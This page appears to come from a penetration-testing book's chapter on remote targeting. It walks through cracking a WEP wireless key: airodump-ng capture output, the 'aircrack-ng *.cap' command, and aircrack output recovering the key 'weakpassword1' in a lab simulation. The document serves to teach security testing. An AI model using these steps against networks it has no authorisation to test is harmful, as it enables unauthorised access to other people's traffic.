<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf102" class="pf w2 h2" data-page-no="102"><div class="pc pc102 w2 h2"><div class="t m0 xa3 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 7: Phase III: Remote T<span class="_ _0"/>argeting<span class="_ _9"> </span><span class="ff1 fs9 lsa">235</span></div><div class="t m0 x3 h40 ya80 fff fs5 fc0 sc0 ls0 ws0">BSSID              STATION            PWR   Rate    Lost  Packets  Probes</div><div class="t m0 x3 h40 y1861 fff fs5 fc0 sc0 ls0 ws0">02:E9:FF:34:E7:F4  00:1F:BD:DD:20:51   -7    0e- 1    360    47022</div><div class="t m0 x3 h40 y1862 fff fs5 fc0 sc0 ls0 ws0">02:E9:FF:34:E7:F4  00:22:FB:0E:3D:12  -28    0e- 1    907    28808</div><div class="t m0 x4 hd y1863 ff4 fs7 fc0 sc0 ls0 ws0">After we’<span class="_ _2"/>ve started capturing packets with airodump, we can start the cracking </div><div class="t m0 x3 h3f y1864 ff4 fs7 fc0 sc0 ls0 ws0">session with aircrack. Simply use the <span class="fff">aircrack-ng</span> command, gi<span class="_ _0"/>ving the only </div><div class="t m0 x3 hd y1865 ff4 fs7 fc0 sc0 ls0 ws0">argument of the PCAP les that contain the captured pack<span class="_ _0"/>ets, as in the following </div><div class="t m0 x3 hd y1866 ff4 fs7 fc0 sc0 ls0 ws0">example:</div><div class="t m0 x3 h44 y1867 fff fse fc0 sc0 ls0 ws0">root@kali:~/wep# aircrack-ng *.cap</div><div class="t m0 x4 hd y1868 ff4 fs7 fc0 sc0 ls0 ws0">If you’<span class="_ _2"/>ve obtained enough packets, you’ll see output from aircrack similar to the </div><div class="t m0 x3 hd y1869 ff4 fs7 fc0 sc0 ls0 ws0">follo<span class="_ _0"/>wing output. <span class="_ _3"/>Y<span class="_ _3"/>ou can see the password recov<span class="_ _0"/>ered is “weakpassword1.<span class="_ _3"/>”</div><div class="t m0 x3 h40 y186a fff fs5 fc0 sc0 ls0 ws0">                                    Aircrack-ng 1.1</div><div class="t m0 x3 h40 y186b fff fs5 fc0 sc0 ls0 ws0">                    [00:00:01] Tested 451787 keys (got 60502 IVs)</div><div class="t m0 x3 h40 y186c fff fs5 fc0 sc0 ls0 ws0">   KB    depth   byte(vote)</div><div class="t m0 x3 h40 y186d fff fs5 fc0 sc0 ls0 ws0">    0    0/  1   77(85760) 8D(72704) DD(70144) 23(69888) BB(69376) F8(68864) </div><div class="t m0 x3 h40 y186e fff fs5 fc0 sc0 ls0 ws0">    1    0/  1   65(81408) 55(74496) B8(72960) 51(71680) 21(71168) C2(70656) </div><div class="t m0 x3 h40 y186f fff fs5 fc0 sc0 ls0 ws0">    2    0/  1   61(86272) AC(71424) 16(70912) 07(70144) 33(69376) 79(68864) </div><div class="t m0 x3 h40 y1870 fff fs5 fc0 sc0 ls0 ws0">    3    0/  1   6B(77312) 85(73472) 77(69888) CB(69632) D4(69632) 09(69120) </div><div class="t m0 x3 h40 y1871 fff fs5 fc0 sc0 ls0 ws0">    4    0/  1   70(74496) B2(71936) 68(71680) D4(71680) C9(69888) CD(69632) </div><div class="t m0 x3 h40 y1872 fff fs5 fc0 sc0 ls0 ws0">    5    0/  1   61(80640) 75(70400) C0(69888) 88(69632) 7C(68608) 4B(68096) </div><div class="t m0 x3 h40 y1873 fff fs5 fc0 sc0 ls0 ws0">    6    0/  1   73(80384) FE(71936) CA(71168) 9B(70912) 83(70400) 35(70144) </div><div class="t m0 x3 h40 y1874 fff fs5 fc0 sc0 ls0 ws0">    7    0/  1   73(83968) 21(72704) 95(72704) FF(68864) 81(68352) 8F(68096) </div><div class="t m0 x3 h40 y1875 fff fs5 fc0 sc0 ls0 ws0">    8    0/  1   77(82176) 53(70656) 1E(69632) 79(69376) 2A(68608) A7(68352) </div><div class="t m0 x3 h40 y1876 fff fs5 fc0 sc0 ls0 ws0">    9    0/  4   33(73472) B5(72192) 22(71680) 45(71424) 12(70400) 64(70144) </div><div class="t m0 x3 h40 y1877 fff fs5 fc0 sc0 ls0 ws0">   10    0/  1   62(70656) 9B(69632) 47(68608) 6F(68608) 75(68608) 5A(68352) </div><div class="t m0 x3 h40 y1878 fff fs5 fc0 sc0 ls0 ws0">   11    0/  1   61(69376) 84(68864) 39(68608) 8D(68608) 08(68096) 09(68096) </div><div class="t m0 x3 h40 y1879 fff fs5 fc0 sc0 ls0 ws0">   12    1/  2   31(72080) 85(69476) C5(68296) C0(68076) 5B(67900) B4(67612) </div><div class="t m0 x3 h40 y187a fff fs5 fc0 sc0 ls0 ws0">     KEY FOUND! [ 77:65:61:6B:70:61:73:73:77:6F:72:64:31 ] (ASCII: </div><div class="t m0 x3 h40 y187b fff fs5 fc0 sc0 ls0 ws0">weakpassword1 )</div><div class="t m0 x3 h40 y187c fff fs5 fc0 sc0 ls0 ws0">      Decrypted correctly: 100%</div><div class="t m0 x4 hd y187d ff4 fs7 fc0 sc0 ls0 ws0">If you notice the output from the airodump program, the total elapsed time is only </div><div class="t m0 x3 hd y187e ff4 fs7 fc0 sc0 ls0 ws0">30 minutes and we captured ov<span class="_ _0"/>er 60,000 packets! <span class="_ _0"/>This was done as a simulation by </div><div class="t m0 x3 hd y187f ff4 fs7 fc0 sc0 ls0 ws0">simply playing a single streaming video for 30 minutes! If that’<span class="_ _2"/>s all it takes to crack </div><div class="t m0 x3 hd y1880 ff4 fs7 fc0 sc0 ls0 ws0">a 128-bit <span class="_ _0"/>WEP ke<span class="_ _0"/>y<span class="_ _2"/>, then imagine how easy it is in the wild with an<span class="_ _0"/>y moderate use of </div><div class="t m0 x3 hd y1881 ff4 fs7 fc0 sc0 ls0 ws0">the network.</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>
